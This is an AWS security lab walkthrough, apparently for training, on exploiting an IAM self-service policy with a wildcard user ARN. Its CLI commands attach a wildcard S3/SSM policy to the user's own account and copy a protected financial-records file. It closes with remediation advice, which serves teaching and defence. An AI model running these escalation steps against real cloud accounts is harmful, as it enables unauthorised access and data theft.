# IAM Privilege Escalation

Exploit IAM policy misconfiguration to escalate privileges and access protected S3 data.

## Objectives

- Enumerate IAM user permissions and identify overly permissive resource ARN patterns
- Exploit self-service IAM policies for privilege escalation
- Access protected S3 resources after escalation

## MITRE ATT&CK

- T1078.004 - Valid Accounts: Cloud Accounts
- T1098.001 - Account Manipulation: Additional Cloud Credentials
- T1530 - Data from Cloud Storage Object

## Architecture

- IAM user with programmatic access and self-service credential management policy
- Inline IAM policy with misconfigured resource ARN allowing policy attachment to any user
- Protected S3 bucket containing financial data
- SSM Parameter Store with configuration data
- Admin automation role with elevated S3 permissions

## Walkthrough

### 1. Configure credentials

Export the credentials from lab outputs:

```bash
export AWS_ACCESS_KEY_ID=<access_key_id>
export AWS_SECRET_ACCESS_KEY=<secret_access_key>
export AWS_DEFAULT_REGION=us-east-1
```

### 2. Enumerate current user

```bash
aws iam get-user
```

Note the username from the output.

### 3. List attached policies

```bash
aws iam list-user-policies --user-name <username>
```

### 4. Examine policy details

```bash
aws iam get-user-policy --user-name <username> --policy-name SelfServicePolicy
```

Look at the Resource ARN in the policy. The misconfiguration: `arn:aws:iam::*:user/*` allows actions on any user, not just `${aws:username}`.

### 5. Create escalation policy

```bash
cat > escalate.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:*",
        "ssm:*"
      ],
      "Resource": "*"
    }
  ]
}
EOF
```

### 6. Attach policy to your user

```bash
aws iam put-user-policy \
  --user-name <username> \
  --policy-name EscalatedAccess \
  --policy-document file://escalate.json
```

### 7. Verify escalation

```bash
aws iam list-user-policies --user-name <username>
```

You should see `EscalatedAccess` in the list.

### 8. Find the protected bucket

```bash
aws s3 ls
```

Or check SSM for hints:

```bash
aws ssm describe-parameters
aws ssm get-parameter --name <parameter-name>
```

### 9. Access protected data

```bash
aws s3 ls s3://<protected-bucket>/
aws s3 cp s3://<protected-bucket>/financial-records.csv .
```

### 10. Cleanup (optional)

Remove the escalation policy:

```bash
aws iam delete-user-policy --user-name <username> --policy-name EscalatedAccess
rm escalate.json
```

## Remediation

- Use `${aws:username}` in resource ARNs for self-service policies
- Implement permission boundaries for delegated administration
- Alert on `iam:PutUserPolicy` actions via CloudTrail
- Use AWS IAM Access Analyzer to detect overly permissive policies

## References

- https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_variables.html
- https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/